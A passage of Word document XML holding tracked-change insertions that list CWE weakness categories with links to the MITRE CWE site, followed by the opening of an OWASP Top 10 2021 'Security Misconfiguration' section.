        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Credentials](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/522.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5700B092" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1751" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1752" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-525: Use of Web Browser Cache Containing Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/525.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5082ADE0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1753" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1754" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-539: Use of Persistent Cookies Containing Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/539.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4055463D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1755" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1756" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-579: J2EE Bad Practices: Non-serializable Object Stored in </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Session](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/579.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2274602A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1757" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1758" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-598: Use of GET Request Method With Sensitive Query </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Strings](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/598.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6599E21A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1759" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1760" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-602: Client-Side Enforcement of Server-Side </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Security](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/602.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B83FE26" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1761" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1762" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-642: External Control of Critical State </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Data](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/642.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="71B9D78F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1763" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1764" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-646: Reliance on File Name or Extension of Externally-Supplied </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/646.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="018F8E67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1765" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1766" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-650: Trusting HTTP Permission Methods on the Server </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Side](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/650.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7B56A5DC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1767" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1768" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-653: Insufficient </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Compartmentalization](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/653.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4625DBB7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1769" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1770" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-656: Reliance on Security Through </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Obscurity](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/656.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="356AC4FC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1771" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1772" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-657: Violation of Secure Design </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Principles](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/657.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5C13D8A7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1773" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1774" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-799: Improper Control of Interaction </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Frequency](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/799.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="006B6819" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1775" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1776" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-807: Reliance on Untrusted Inputs in a Security </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Decision](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/807.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="33852A00" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1777" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1778" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-840: Business Logic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Errors](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/840.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16A90E35" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1779" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1780" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-841: Improper Enforcement of Behavioral </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Workflow](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/841.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E92BBD0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1781" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1782" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-927: Use of Implicit Intent for Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Communication](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/927.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E3C17BC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1783" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1784" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1021: Improper Restriction of Rendered UI Layers or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Frames](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1021.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3267383A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1785" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1786" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1173: Improper Use of Validation </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Framework](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1173.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3CE4D400" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A5D00E"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412B6A93"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"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A459CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A05:2021 – Security Misconfiguration"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7115E37D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
